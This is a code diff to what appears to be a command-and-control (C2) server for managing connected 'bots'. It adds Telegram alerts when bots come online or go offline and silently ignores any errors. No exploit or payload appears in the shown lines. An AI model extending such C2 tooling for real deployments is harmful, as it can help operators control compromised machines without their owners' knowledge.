@@ -130,22 +130,35 @@ class Bot:
 
 
 class BotRegistry:
-    def __init__(self):
+    def __init__(self, telegram=None):
         self.bots = {}
         self.lock = threading.Lock()
         self.events = queue.Queue()
+        self.telegram = telegram
 
     def add(self, bot: Bot):
         with self.lock:
             self.bots[bot.id] = bot
         self.events.put({"type": "bot_online", "bot": bot.info})
         log("bot online: %s (%s)", bot.id, bot.addr)
+        tg = self.telegram
+        if tg is not None and tg.configured() and tg.enabled:
+            try:
+                tg.notify_bot_online(bot.id, bot.info)
+            except Exception:
+                pass
 
     def remove(self, bot: Bot):
         with self.lock:
             self.bots.pop(bot.id, None)
         self.events.put({"type": "bot_offline", "bot": bot.info})
         log("bot offline: %s", bot.id)
+        tg = self.telegram
+        if tg is not None and tg.configured() and tg.enabled:
+            try:
+                tg.notify_bot_offline(bot.id)
+            except Exception:
+                pass
 
     def get(self, bot_id: str):
         with self.lock:
@@ -354,6 +367,7 @@ class C2Server:
     def __init__(self, cfg: dict, secret: str):
         self.cfg = cfg
         self.secret = secret
+        self.telegram = None
         self.registry = BotRegistry()
         c2 = cfg.get("c2", {})
         # "bind" is where the socket listens; "host" is the address the
